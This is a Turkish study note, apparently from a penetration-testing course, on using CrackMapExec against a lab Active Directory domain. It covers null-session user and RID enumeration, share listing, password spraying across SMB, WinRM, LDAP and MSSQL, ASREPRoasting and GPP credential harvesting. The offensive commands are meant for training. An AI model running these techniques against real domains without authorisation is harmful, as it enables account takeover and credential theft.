crackmapexec smb 10.129.203.121 -u '' -p '' --users --export $(pwd)/users.txt

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [-] Error enumerating
domain users using dc ip 10.129.203.121: NTLM needs domain\username and a
password
SMB 10.129.203.121 445 DC01 [*] Trying with SAMRPC
protocol
SMB 10.129.203.121 445 DC01 [+] Enumerated domain
user(s)
SMB 10.129.203.121 445 DC01
inlanefreight.htb\Guest Built-in account for
guest access to the computer/domain
SMB 10.129.203.121 445 DC01
inlanefreight.htb\carlos
SMB 10.129.203.121 445 DC01
inlanefreight.htb\grace
SMB 10.129.203.121 445 DC01
inlanefreight.htb\peter
SMB 10.129.203.121 445 DC01 
inlanefreight.htb\alina Account for testing HR
App. Password: HRApp123!
SMB 10.129.203.121 445 DC01
inlanefreight.htb\noemi
SMB 10.129.203.121 445 DC01
inlanefreight.htb\engels Service Account for
testing
SMB 10.129.203.121 445 DC01
inlanefreight.htb\kiosko
SMB 10.129.203.121 445 DC01
inlanefreight.htb\testaccount pwd: Testing123!
SMB 10.129.203.121 445 DC01
inlanefreight.htb\mathew
SMB 10.129.203.121 445 DC01
inlanefreight.htb\svc_mssql
```

Export edilen dosyayı, tüm kullanıcıların bir listesini almak için kullanabiliriz; daha sonra bu listeyi kullanacağız.


### Kullanıcı Listesini Çıkarma

```
sed -i "s/'/\"/g" users.txt
jq -r '.[]' users.txt > userslist.txt
cat userslist.txt
Guest
carlos
grace
peter
alina
noemi
engels
kiosko
testaccount
mathew
svc_mssql
gmsa_adm
belkis
nicole
jorge
linda
shaun
diana
patrick
elieser

```

Burada, herhangi bir hesap olmadan tüm domain kullanıcılarını ve password policy'yi listeleyebiliriz. Bu yapılandırma her zaman mevcut olmayabilir, ancak mevcutsa, domain'i ele geçirme amacımıza başlamak için bize yardımcı olacaktır.


### Kullanıcıları rid bruteforce ile numaralandırma

Bir domainin kullanıcılarını belirlemek için --rid-brute seçeneği kullanılabilir. Bu seçenek özellikle NULL Authentication'a sahip ancak belirli sorgu kısıtlamaları olan bir domain ile uğraşırken kullanışlıdır. Bu seçeneği kullanarak, domain'deki kullanıcıları ve diğer nesneleri numaralandırabiliriz.


### Enumerating Users with --rid-brute

```
crackmapexec smb 10.129.204.172 -u '' -p '' --rid-brute

SMB 10.129.204.172 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True)
(SMBv1:False)
SMB 10.129.204.172 445 DC01 [+] Brute forcing RIDs
SMB 10.129.204.172 445 DC01 498:
INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB 10.129.204.172 445 DC01 500:
INLANEFREIGHT\Administrator (SidTypeUser)
SMB 10.129.204.172 445 DC01 501:
INLANEFREIGHT\Guest (SidTypeUser)
SMB 10.129.204.172 445 DC01 502:
INLANEFREIGHT\krbtgt (SidTypeUser)
SMB 10.129.204.172 445 DC01 512:
INLANEFREIGHT\Domain Admins (SidTypeGroup)
SMB 10.129.204.172 445 DC01 513:
INLANEFREIGHT\Domain Users (SidTypeGroup)
...SNIP...
SMB 10.129.204.172 445 DC01 1853:
INLANEFREIGHT\abinateps (SidTypeUser)
SMB 10.129.204.172 445 DC01 1854:
INLANEFREIGHT\bustoges (SidTypeUser)
SMB 10.129.204.172 445 DC01 1855:
INLANEFREIGHT\nobseellace (SidTypeUser)
SMB 10.129.204.172 445 DC01 1856:
INLANEFREIGHT\wormithe (SidTypeUser)
SMB 10.129.204.172 445 DC01 1857:
INLANEFREIGHT\therbanstook (SidTypeUser)
SMB 10.129.204.172 445 DC01 1858:
INLANEFREIGHT\sweend (SidTypeUser)
SMB 10.129.204.172 445 DC01 1859:
INLANEFREIGHT\voge1993 (SidTypeUser)
SMB 10.129.204.172 445 DC01 1860:
INLANEFREIGHT\lach1973 (SidTypeUser)
SMB 10.129.204.172 445 DC01 1861:
INLANEFREIGHT\coulart77 (SidTypeUser)
SMB 10.129.204.172 445 DC01 1862:
INLANEFREIGHT\whirds (SidTypeUser)
SMB 10.129.204.172 445 DC01 1863:
INLANEFREIGHT\sturhe (SidTypeUser)
SMB 10.129.204.172 445 DC01 1864:
INLANEFREIGHT\turittly (SidTypeUser)
...SNIP...
```


Varsayılan olarak, `--rid-brute`, RIDs değerlerini brute force ile 4000'e kadar enumerate eder. Davranışını değiştirmek için `--rid-brute [MAX_RID]` kullanabiliriz.

**Not:** Bazı senaryolarda, NULL authentication ile RIDs brute force yapılabilir.


### Enumerating Shares

Paylaşılan klasörler ile ilgili olarak, server konfigürasyonuna bağlı olarak, herhangi bir hesap kullanmadan sadece `--shares` seçeneğini yazarak paylaşımlara erişebiliriz. Eğer hata alırsak, paylaşılan klasörleri listelemek için var olmayan rastgele bir isim veya guest/anonymous hesaplarını şifresiz olarak deneyebiliriz.

#### Enumerating Shares

```
crackmapexec smb 10.129.203.121 -u '' -p '' --shares

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\:
SMB 10.129.203.121 445 DC01 [-] Error enumerating
shares: STATUS_ACCESS_DENIED
```


```
crackmapexec smb 10.129.203.121 -u guest -p '' --shares
SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\guest:
SMB 10.129.203.121 445 DC01 [+] Enumerated shares
SMB 10.129.203.121 445 DC01 Share
Permissions Remark
SMB 10.129.203.121 445 DC01 ----- ------
----- ------
SMB 10.129.203.121 445 DC01 ADMIN$
Remote Admin
SMB 10.129.203.121 445 DC01 C$
Default share
SMB 10.129.203.121 445 DC01 carlos
SMB 10.129.203.121 445 DC01 D$
Default share
SMB 10.129.203.121 445 DC01 david
SMB 10.129.203.121 445 DC01 IPC$ READ
Remote IPC
SMB 10.129.203.121 445 DC01 IT
SMB 10.129.203.121 445 DC01 john
SMB 10.129.203.121 445 DC01 julio
SMB 10.129.203.121 445 DC01 linux01
READ,WRITE
SMB 10.129.203.121 445 DC01 NETLOGON
Logon server share
SMB 10.129.203.121 445 DC01 svc_workstations
SMB 10.129.203.121 445 DC01 SYSVOL
Logon server share
SMB 10.129.203.121 445 DC01 Users READ
```


Topladığımız bilgiler, domain içinde foothold elde etmek için faydalı olabilir. Password policy'deki bilgileri kullanarak bir Password Spraying saldırısı düzenleyebilir, ASREPRoasting gibi saldırılar gerçekleştirebilir veya açık bir share folder üzerinden gizli bilgilere erişim sağlayabiliriz.

Burada kaldım 

----

### Understanding Password Policy
Password Policy için Microsoft belgeleri, Windows için [password ilkelerine](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/password-policy) genel bir bakış ve her ilke ayarı için bilgi bağlantıları sağlar.

Çıktıda gördüğümüz politika ayarlarından biri, 1 olarak ayarlanmış olan Domain Password Complex'tir.[ Password must meet complexity requirements]([Password must meet complexity requirements - Windows 10 | Microsoft Learn](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/password-must-meet-complexity-requirements)) politika ayarı, parolaların bir dizi güçlü parola yönergesini karşılaması gerekip gerekmediğini belirler. Etkinleştirildiğinde, bu ayar parolaların aşağıdaki ölçütleri karşılamasını gerektirir:

* Parolalar, kullanıcının sAMAccountName (kullanıcı hesabı adı) değerini veya displayName'in tamamını (tam ad değeri) içeremez. Her iki kontrol de büyük/küçük harfe duyarlı değildir.
* Parola aşağıdaki kategorilerden üçünden karakter içermelidir:
* Avrupa dillerinin büyük harfleri (A'dan Z'ye, aksan işaretleri, Yunanca ve Kiril karakterleri ile birlikte)
* Avrupa dillerinin küçük harfleri (a'dan z'ye, diyezli, aksan işaretli, Yunanca ve Kiril karakterli)
*  Taban 10 basamakları (0 ile 9 arası)
* Alfasayısal olmayan karakterler (özel karakterler): hide01.ir (~!@#$%^&*_-+=`|\(){} []:;"'<>,.?/) Euro veya İngiliz Sterlini gibi para birimi sembolleri bu ilke ayarı için özel karakter olarak sayılmaz.
* Alfabetik karakter olarak sınıflandırılan ancak büyük veya küçük harf olmayan herhangi bir Unicode karakteri. Bu grup Asya dillerindeki Unicode karakterlerini içerir.

Not: Parolalar değiştirildiğinde veya oluşturulduğunda karmaşıklık gereksinimleri uygulanır.

Password Spraying saldırısı için numaralandırılması gereken bir diğer önemli parametre de Account Lockout Threshold'dur (Hesap Kilitleme Eşiği) . Bu ilke ayarı, bir kullanıcı hesabının kilitlenmesine neden olacak başarısız oturum açma girişimlerinin sayısını belirler. Kilitli bir hesap, siz sıfırlayana kadar veya CrackMapExec çıktısında da görüntülenen Hesap Kilitleme Süresi ilke ayarı tarafından belirtilen dakika sayısı sona erene kadar kullanılamaz.

Bu şifre politikasına dayanarak, kilitleme politikası yoktur. İstediğimiz kadar parola deneyebiliriz ve hesaplar kilitlenmez. Politikaya göre, parola en az yedi karakterden oluşacak ve en az birer büyük ve küçük harf ile bir özel karakter içerecektir.

Not: CrackMapExec, varsa Password Setting Objects'i (PSO) değil, yalnızca Default Password Policy'yi kontrol eder.


### Password Spraying
NULL Session açığını kötüye kullanan kullanıcıların bir listesini bulduk. Şimdi domain'de bir yer edinmek için geçerli bir şifre bulmamız gerekiyor. Elimizde uygun bir kullanıcı listesi yoksa veya hedef NULL Session saldırısına karşı savunmasız değilse, geçerli kullanıcı adlarını bulmak için OSINT (yani LinkedIn'de avlanma), geniş bir kullanıcı adı listesi ve Kerbrute ile brute-forcing, fiziksel keşif vb. gibi başka bir yola ihtiyacımız olacaktır. Bu bölümde, bir kullanıcı adı listesine sahip olduğumuzda bir dizi hedefe karşı kimlik doğrulamayı test ederek geçerli bir kimlik bilgisi kümesini nasıl bulacağımızı öğreneceğiz.

### Creating a Password List
Bu kullanıcıların şifrelerini bilmiyoruz, ancak bildiğimiz şey şifre politikasıdır. Welcome1 ve Password123 gibi yaygın parolalardan oluşan özel bir sözcük listesi, sonunda yıl olan geçerli ay, şirket adı veya domain adı oluşturabilir ve farklı mutasyonlar uygulayabiliriz. Parola mutasyonları hakkında daha fazla bilgi edinmek için Akademi modülü Parola Saldırıları'na göz atın. Parola olarak alan adını büyük harf, sayı ve sonunda ünlem işareti ile kullanalım:

### Password List & User List
![Pasted image 20241201174311.png](/img/user/resimler/Pasted%20image%2020241201174311.png)

![Pasted image 20241201174734.png](/img/user/resimler/Pasted%20image%2020241201174734.png)

Not: Bu bölümdeki alıştırmaları tamamlamak için kullanıcı adı listesinin tamamını kullanmamız gerekecek

Şimdi protokolü ve hedefi seçmemiz ve kullanıcı adı(ları) veya kullanıcı adlarını içeren dosya(lar) sağlamak için -u seçeneğini ve parola(lar) veya parolaları içeren dosya(lar) sağlamak için -p seçeneğini kullanmamız gerekir. SMB protokolünü kullanan bazı örnekler görelim:


### Kullanıcı Adları ve Tek Bir Parola İçeren Bir Dosya ile Parola Saldırısı
![Pasted image 20241201185226.png](/img/user/resimler/Pasted%20image%2020241201185226.png)
![Pasted image 20241201185233.png](/img/user/resimler/Pasted%20image%2020241201185233.png)


### Kullanıcı Adları Listesi ve Tek Bir Parola ile Parola Saldırısı
![Pasted image 20241201185309.png](/img/user/resimler/Pasted%20image%2020241201185309.png)


### Kullanıcı Adı Listesi ve İki Parola ile Parola Saldırısı
![Pasted image 20241201191750.png](/img/user/resimler/Pasted%20image%2020241201191750.png)

Çıktıdan da görebileceğimiz gibi, yeşil renkle temsil edilen ve [+] çıktısıyla başlayan domain'de yalnızca bir geçerli kimlik bilgisi bulduk. Bununla birlikte, tüm hesaplar test edilmemiştir. İlk geçerli kimlik bilgileri bulunduktan sonra, CME password spraying işlemini durdurur çünkü bu genellikle domain numaralandırmasının geri kalanı için yeterlidir. Bazen, ayrıcalıklı bir hesap bulabileceğimiz için tüm hesapları test etmek daha iyidir. Bu amaçla, CME -- continue-on-success seçeneği ile birlikte gelir:


### Continue on Success
![Pasted image 20241201192236.png](/img/user/resimler/Pasted%20image%2020241201192236.png)

Ayrıca, her kullanıcı için tüm parolaları test edecek olan passwords.txt gibi bir dosya ile bir parola listesi sağlayabiliriz, bu parola püskürtme için yararlı olabilir, ancak bir Hesap Kilitleme ilkesi ayarlandığında çok fazla değil. Hesap Kilitleme konusunu bu bölümün ilerleyen kısımlarında ele alacağız.

Hesap kilitlemenin 5 olarak ayarlandığını biliyorsak, bir hesabın kilitlenmesini önlemek için 2 veya 3 paroladan oluşan bir parola listesi oluşturabiliriz.


### Kullanıcı Adı Listesi ve Parola Listesi ile Parola Saldırısı
![Pasted image 20241201193230.png](/img/user/resimler/Pasted%20image%2020241201193230.png)![Pasted image 20241201193238.png](/img/user/resimler/Pasted%20image%2020241201193238.png)


### Bir Kullanıcı İçin Bir Parolanın Eşit Olup Olmadığını Kontrol Etme Kelime Listesi
CME'nin bir başka harika özelliği de, her kullanıcının parolasını biliyorsak ve hala geçerli olup olmadıklarını test etmek istiyorsak. Bunun için --no-bruteforce seçeneğini kullanın. Bu seçenek 1. kullanıcıyı 1. parola ile, 2. kullanıcıyı 2. parola ile ve bu şekilde kullanacaktır.


### Disable Bruteforcing
![Pasted image 20241201193623.png](/img/user/resimler/Pasted%20image%2020241201193623.png)

![Pasted image 20241201193717.png](/img/user/resimler/Pasted%20image%2020241201193717.png)

![Pasted image 20241201193844.png](/img/user/resimler/Pasted%20image%2020241201193844.png)


### Testing Local Accounts

Domain hesabı yerine bir lokal hesabı test etmek istersek, CrackMapExec'te -- local-auth seçeneğini kullanabiliriz:

### Lokal Hesap Nedir?

- **Lokal hesap**, bir bilgisayara **yalnızca o bilgisayarda** bulunan kullanıcı hesabıdır. Bu hesap, bir **domain** (etki alanı) yönetimi altında değildir.
- Örneğin, bir Windows bilgisayarda "Administrator" veya başka bir yerel kullanıcı hesabı, **lokal hesap**tır.
- Bu hesaplar, sadece o makinede geçerli kullanıcı adı ve şifreye sahiptir.

**Domain hesabı** ise bir **Active Directory (AD)** ortamında tanımlanmış kullanıcı hesabıdır ve etki alanındaki herhangi bir bilgisayarda kullanılabilir.


### Password Spraying Local Accounts
![Pasted image 20241201194034.png](/img/user/resimler/Pasted%20image%2020241201194034.png)

Not: Domain Controller'ların lokal bir hesap veritabanı yoktur, bu yüzden bir Domain Controller'a karşı -- local-auth bayrağını kullanamayız.


### Hesap Kilitleme

Password Spraying işlemini gerçekleştirirken dikkatli olun. Değerden emin olmamız gerekiyor: Hesap Kilitleme Eşiği Yok olarak ayarlanmıştır. Bir değer varsa (genellikle 5), her hesapta denediğimiz deneme sayısına dikkat edin ve sayacın 0'a sıfırlandığı pencereyi (genellikle 30 dakika) gözlemleyin. Aksi takdirde, domain'deki tüm hesapları 30 dakika veya daha uzun süre kilitleme riski vardır (bunun ne kadar olduğunu öğrenmek için Kilitli Hesap Süresi'ni kontrol edin). Bazen bir domain parola politikası, bir yöneticinin hesapların kilidini manuel olarak açmasını gerektirecek şekilde ayarlanır ve bu da dikkatsiz Parola Püskürtme ile bir veya daha fazla hesabı kilitlediğimizde daha da büyük bir sorun yaratabilir. Zaten bir kullanıcı hesabınız varsa, kullanıcının yanlış bir parola kullanarak hesapta oturum açmayı kaç kez denediğini ölçen Bad-Pwd-Count özniteliğini sorgulayabilirsiniz.


### Query Bad Password Count
![Pasted image 20241201194518.png](/img/user/resimler/Pasted%20image%2020241201194518.png)
![Pasted image 20241201194803.png](/img/user/resimler/Pasted%20image%2020241201194803.png)


Bu bilgilerle, parola saldırıları için daha iyi bir strateji oluşturabilirsiniz.
Not: Kullanıcı doğru kimlik bilgileriyle kimlik doğrulaması yaparsa Hatalı Parola Sayısı sıfırlanır.


### Account Status

Bir hesabı test ettiğimizde, CME'nin görüntüleyebileceği üç renk vardır:

![Pasted image 20241201195348.png](/img/user/resimler/Pasted%20image%2020241201195348.png)

Parola hala geçerliyken çeşitli nedenlerle kimlik doğrulama başarısız olabilir. İşte tam bir liste:

![Pasted image 20241201195434.png](/img/user/resimler/Pasted%20image%2020241201195434.png)

Nedenine bağlı olarak, örneğin, STATUS_INVALID_LOGON_HOURS veya STATUS_INVALID_WORKSTATION başka bir workstation veya başka bir zaman denemek için iyi bir fikir olabilir. STATUS_PASSWORD_MUST_CHANGE mesajı durumunda, Impacket smbpasswd kullanarak kullanıcının şifresini şu şekilde değiştirebiliriz: smbpasswd -r domain -U user .


### Durumu PASSWORD_MUST_CHANGE Olan Bir Hesabın Parolasını Değiştirme
![Pasted image 20241201195605.png](/img/user/resimler/Pasted%20image%2020241201195605.png)

Burada hedef kullanıcının parolasını değiştirebiliriz. Bir sızma testi sırasında, hesap şifrelerini değiştirirken dikkatli olmak ve her zaman rapor eklerimizde hesap değişikliklerini not etmek isteriz. Hedef hesap uzun süredir oturum açmadıysa, parolayı değiştirmek, aktif olarak kullanılan bir hesaba göre muhtemelen daha güvenlidir. Genellikle bir kuruluş kullanılmayan hesapları devre dışı bırakır, ancak zaman zaman değerlendirme hedefimize doğru ilerlemek için şifrelerini değiştirebileceğimiz unutulmuş hesaplarla karşılaşırız. Şüpheniz varsa, herhangi bir değişiklik yapmadan önce her zaman müşteriye danışın.

![Pasted image 20241201200048.png](/img/user/resimler/Pasted%20image%2020241201200048.png)
![Pasted image 20241201200057.png](/img/user/resimler/Pasted%20image%2020241201200057.png)

Artık yeni parola ile kimlik doğrulaması yapabiliriz.

![Pasted image 20241201200121.png](/img/user/resimler/Pasted%20image%2020241201200121.png)


### Target Protocol WinRM

Varsayılan olarak, esasen Remote Management (uzaktan yönetim) için tasarlanmış olan[ Windows Remote Management (WinRM)](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) servisi, bir hedef üzerinde PowerShell komutlarını çalıştırmamıza izin verir. WinRM, Windows Server 2012 R2 / 2016 / 2019 üzerinde TCP/5985 (HTTP) ve TCP/5986 (HTTPS) portlarında varsayılan olarak etkindir. PowerShell Remoting, [Yönetim için Web Hizmetleri (WSManagement)](https://www.dmtf.org/sites/default/files/standards/documents/DSP0226_1.2.0.pdf) protokolünün Microsoft uygulaması olan [Windows Remote Management'](https://learn.microsoft.com/en-us/windows/win32/winrm/portal)ı (WinRM) kullanır

Remote bir bilgisayardaki WinRM servisine bağlanmak için local administrator ayrıcalıklarına sahip olmamız, Remote Management Users grubunun bir üyesi olmamız veya oturum yapılandırmasında PowerShell Remoting için açık izinlere sahip olmamız gerekir.

WinRM, bir parolanın geçerli olup olmadığını belirlemek için en iyi protokol değildir, çünkü yalnızca WinRM'ye erişimi varsa hesabın geçerli olduğunu gösterecektir. Bu senaryoda, bulduğumuz üç (3) hesabı test edebilir ve bu üç (3) hesaptan herhangi birinin WinRM'ye erişimi olup olmadığını görmek için --no-bruteforce seçeneğini kullanabiliriz.


### WinRM - Password Spraying
![Pasted image 20241201200742.png](/img/user/resimler/Pasted%20image%2020241201200742.png)
![Pasted image 20241201200747.png](/img/user/resimler/Pasted%20image%2020241201200747.png)

![Pasted image 20241201200803.png](/img/user/resimler/Pasted%20image%2020241201200803.png)

Winrm ile daha yüksek yetki edebiliriz.

Local admin haklarına sahip olan Peter hesabı ile sistem üzerinde komut çalıştırabiliriz. Komut Yürütme bölümünde bu konu hakkında daha fazla bilgi vereceğiz.


### LDAP - Password Spraying 

LDAP protokolüne karşı Password Spraying yaparken FQDN kullanmamız gerekir, aksi takdirde hata alırız:


### IP kullanılırken hata oluştu
![Pasted image 20241201201243.png](/img/user/resimler/Pasted%20image%2020241201201243.png)

Bu sorunu çözmek için iki seçeneğimiz var: saldırı hostumuzu domain name server (DNS) kullanacak şekilde yapılandırmak veya KDC FQDN'sini /etc/hosts dosyamızda yapılandırmak. İkinci seçeneği seçelim ve FQDN'yi /etc/hosts dosyamıza ekleyelim:


### FQDN'nin hosts dosyasına eklenmesi ve Parola Püskürtme İşleminin Gerçekleştirilmesi

![Pasted image 20241201201515.png](/img/user/resimler/Pasted%20image%2020241201201515.png)

![Pasted image 20241201201522.png](/img/user/resimler/Pasted%20image%2020241201201522.png)


### Kimlik Doğrulama Mekanizmaları
MSSQL, SSH veya FTP gibi bazı Windows servisleri, kendi kullanıcı veritabanlarını işleyecek veya Windows ile entegre olacak şekilde yapılandırılabilir. Bu durumda, hizmet tarafından kullanılan local veritabanına, Active Directory kullanıcılarına veya hizmetin kurulu olduğu bilgisayarın local kullanıcılarına karşı Parola Püskürtmeyi deneyebiliriz. Farklı kimlik doğrulama mekanizmaları aracılığıyla bir MSSQL Sunucusuna karşı nasıl Parola Püskürtme gerçekleştirebileceğimizi görelim.


### MSSQL - Password Spray
Microsoft SQL Server (MSSQL), verileri tablolarda, sütunlarda ve satırlarda saklayan ilişkisel bir veritabanı yönetim sistemidir. Veritabanları hostları, kullanıcı kimlik bilgileri, Kişisel Tanımlanabilir Bilgiler (PII), işle ilgili veriler ve ödeme bilgileri dahil ancak bunlarla sınırlı olmamak üzere her türlü hassas verinin depolanmasından sorumlu oldukları için yüksek hedef olarak kabul edilirler.


### MSSQL Authentication Mechanisms
MSSQL iki kimlik doğrulama modunu destekler, bu da kullanıcıların Windows veya SQL Server'da oluşturulabileceği anlamına gelir:
![Pasted image 20241201202156.png](/img/user/resimler/Pasted%20image%2020241201202156.png)

Bu, MSSQL'de kimlik doğrulaması yapmak için üç tür kullanıcıya sahip olabileceğimiz anlamına gelir:
4. Active Directory Account. 
5. Local Windows Account. 
6. SQL Account.

Bir Active Directory hesabı için domain adını belirtmemiz gerekir:

### Password Spray - Active Directory Account
![Pasted image 20241201202520.png](/img/user/resimler/Pasted%20image%2020241201202520.png)

Lokal bir Windows Hesabı için, domain seçeneği -d veya hedef makine adı olarak bir nokta (.) belirtmemiz gerekir:

### Password Spray - Local Windows Account

![Pasted image 20241201203121.png](/img/user/resimler/Pasted%20image%2020241201203121.png)
![Pasted image 20241201203129.png](/img/user/resimler/Pasted%20image%2020241201203129.png)

Not: Bu bir Domain Controller olduğundan, Windows local hesapları kullanılmamıştır. Bu örnek, local windows hesapları ile Domain Controller olmayan bir makine hedeflendiğinde geçerli olacaktır.

Genellikle yöneticiler, local kullanım veya test için Active Directory hesaplarıyla aynı isimde hesaplar oluşturabilirler. Active Directory hesabı ile aynı ad ve parola ile oluşturulmuş MSSQL hesapları bulabiliriz. Parolanın yeniden kullanımı çok yaygındır! Bir SQL Hesabı denemek istiyorsak, --local-auth bayrağını belirtmemiz gerekir:


### Password Spray - SQL Account
![Pasted image 20241201203435.png](/img/user/resimler/Pasted%20image%2020241201203435.png)

Gördüğümüz gibi, grace hesabı aynı parola ile MSSQL veritabanında local olarak mevcuttur.


### Other Protocols
Bazen bir kullanıcının yönetici olmayabileceğini, ancak RDP, SSH, FTP gibi diğer protokollere erişim ayrıcalıklarına sahip olabileceğini unutmayın. Parola Püskürtme gerçekleştirirken hedefi anlamak ve mümkün olduğunca çok protokole saldırmaya çalışmak çok önemlidir.

Not: Active Directory kimlik doğrulamasını kullanarak Parola Spreyi yaptığımızda, başarısız parola denemelerinin sayısı tüm protokoller için aynı olacaktır. Örneğin, kilitleme sınırı beş deneme ise ve RDP kullanarak üç parola ve WinRM'ye karşı iki parola denersek, sayı 5'e ulaşacak ve hesabın kilitlenmesine neden olacağız.


### Next Steps
Bu bölümde, geçerli kimlik bilgilerini belirlemeye ve domain'e erişim sağlamaya çalışmak için bir kullanıcı listesi kullanarak farklı protokollere karşı Password Spraying'in nasıl gerçekleştirileceğini öğrendik. Bir sonraki bölümde, brute forcing veya Parola Püskürtme olmadan hesapları tanımlamak için diğer mekanizmalar tartışılacaktır.


### Finding ASREPRoastable Accounts
ASREPRoast saldırısı, Kerberos ön kimlik doğrulaması gerekmeyen kullanıcıları arar. Bu, herhangi birinin bu kullanıcılardan herhangi biri adına KDC'ye bir AS_REQ isteği gönderebileceği ve bir AS_REP mesajı alabileceği anlamına gelir. Bu son mesaj türü, şifresinden türetilen orijinal kullanıcı anahtarı ile şifrelenmiş bir veri yığını içerir. Daha sonra, bu mesaj kullanılarak, kullanıcı nispeten zayıf bir parola seçtiyse, kullanıcı parolası çevrimdışı olarak kırılabilir. Bu saldırı hakkında daha fazla bilgi edinmek için Active Directory Numaralandırmaları ve Saldırıları modülüne göz atın.

Domain üzerinde bir hesabımız yoksa ancak bir kullanıcı adı listemiz varsa, belki şansımız yaver gider ve Kerberos ön kimlik doğrulaması gerektirmeyen seçeneğe sahip bir hesap bulabiliriz. Bu seçenek ayarlanmışsa, kullanıcının şifresiyle çözülebilen şifrelenmiş verileri bulmamızı sağlar.

Daha önce -- asreproast seçeneği ile bulduğumuz kullanıcı listesi ile LDAP protokolünü kullanabilir ve ardından bir dosya adı ve DC'nin FQDN'sini hedef olarak belirtebiliriz. Bu saldırıya karşı savunmasız en az bir hesap olup olmadığını belirlemek için users.txt dosyasının içindeki her hesabı arayacağız:

### ASREPRoast için Bruteforcing Hesapları
![Pasted image 20241201204417.png](/img/user/resimler/Pasted%20image%2020241201204417.png)

Listemize dayanarak, ASREPRoasting'e karşı savunmasız bir hesap bulduk. Geçerli kimlik bilgilerimiz varsa Kerberos ön kimlik doğrulaması gerektirmeyen tüm hesapları talep edebiliriz. ASREPRoast'a karşı savunmasız tüm hesapları istemek için Grace'in kimlik bilgilerini kullanalım.


### Search for ASREPRoast Accounts
![Pasted image 20241201204658.png](/img/user/resimler/Pasted%20image%2020241201204658.png)

Tüm hash'leri aldıktan sonra, 18200 modülü ile Hashcat'i kullanabilir ve bunları kırmayı deneyebiliriz. rockyou.txt kelime listesini kullanalım ve bu hash'leri kırmaya çalışalım:


### Password Cracking
![Pasted image 20241201204805.png](/img/user/resimler/Pasted%20image%2020241201204805.png)
![Pasted image 20241201204816.png](/img/user/resimler/Pasted%20image%2020241201204816.png)
Domain üzerinde geçerli bir hesap bulmanın başka bir yolunu bulduk, bu da ortam hakkında çok daha fazla bilgi toplamamızı ve belki de hosts veya diğer kullanıcıları tehlikeye atmaya başlamamızı sağlayacaktı


### Group Policy Nesnelerinde Hesapları Arama
Bir hesabın kontrolünü ele geçirdiğimizde, gerçekleştirmemiz gereken bazı zorunlu kontroller vardır. Group Policy Objects'de (GPO) yazılı kimlik bilgilerini aramak, özellikle eski bir ortamda (Windows server 2003 / 2008) işe yarayabilir, çünkü her domain kullanıcısı GPO'ları okuyabilir.

CrackMapExec, tüm GPO'ları arayacak ve ilginç kimlik bilgilerini bulacak iki modüle sahiptir. gpp_password ve gpp_autologin modüllerini kullanabiliriz. İlk modül olan gpp_password, Grup İlkesi Tercihleri (GPP) aracılığıyla gönderilen hesaplar için düz metin parolasını ve diğer bilgileri alır. Bu saldırı hakkında daha fazla bilgiyi [Password Discovery and Group Policy Preference Abuse in SYSVOL blog](https://adsecurity.org/?p=2288) yazısında okuyabilirsiniz. İkinci modül olan gpp_autologin, autologin bilgilerini bulmak için Domain Controller'daki registry.xml dosyalarını arar ve varsa kullanıcı adını ve açık metin parolasını döndürür.


### Password GPP
![Pasted image 20241202011439.png](/img/user/resimler/Pasted%20image%2020241202011439.png)


### AutoLogin GPP

![Pasted image 20241202011609.png](/img/user/resimler/Pasted%20image%2020241202011609.png)
![Pasted image 20241202011617.png](/img/user/resimler/Pasted%20image%2020241202011617.png)

Bizim durumumuzda, iki farklı parolaya sahip iki hesap bulduk. Bu hesapların hala geçerli olup olmadığını kontrol edelim:


### Credentials Validation
![Pasted image 20241202011952.png](/img/user/resimler/Pasted%20image%2020241202011952.png)
![Pasted image 20241202011958.png](/img/user/resimler/Pasted%20image%2020241202011958.png)

Her iki hesap da hala geçerlidir ve bunları domain'de kimlik doğrulaması yapmak için kullanabilir, hangi ayrıcalıklara sahip olduklarını belirleyebilir veya bu kimlik bilgilerini yeniden kullanmayı deneyebiliriz

Bu bölüm bize kimlik bilgilerini elde etmek için GPO yapılandırmalarını kötüye kullanmanın birkaç yöntemini öğretti. Bir sonraki bölümde, kimliği doğrulanmış bir kullanıcı olarak daha fazla bilgi toplamanın yollarını tartışmaya devam edeceğiz


### Modüllerle Çalışma
Daha önce tartıştığımız gibi, her CrackMapExec protokolü modülleri destekler. Belirtilen protokol için mevcut modülleri görüntülemek için crackmapexec protocol -L komutunu çalıştırabiliriz. Örnek olarak LDAP protokolünü kullanalım.

### LDAP için Mevcut Modülleri Görüntüle

![Pasted image 20241202012602.png](/img/user/resimler/Pasted%20image%2020241202012602.png)

User-desc modülünü seçelim ve modüllerle nasıl etkileşime girebileceğimizi görelim

Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi /etc/hosts dosyasında yapılandırmamız gerekir. Hedef IP'yi FQDN dc01.inlanefreight.htb olarak yapılandırın.


### Modüllerdeki Seçenekleri Belirleme
Bir CrackMapExec modülü, bazı özel değerleri ayarlamak için farklı seçeneklere sahip olabilir. MAQ gibi herhangi bir seçeneği olmayan modüller olabilir, bu da varsayılan eylemini değiştiremeyeceğimiz anlamına gelir. Bir modülün desteklenen seçeneklerini görüntülemek için aşağıdaki sözdizimini kullanabiliriz: ==crackmapexec protocol -M module_name --options==


### LDAP MAQ Modülü için Seçenekleri Görüntüle
![Pasted image 20241202014810.png](/img/user/resimler/Pasted%20image%2020241202014810.png)


### LDAP user-desc Modülü için Seçenekleri Görüntüle
![Pasted image 20241202020137.png](/img/user/resimler/Pasted%20image%2020241202020137.png)
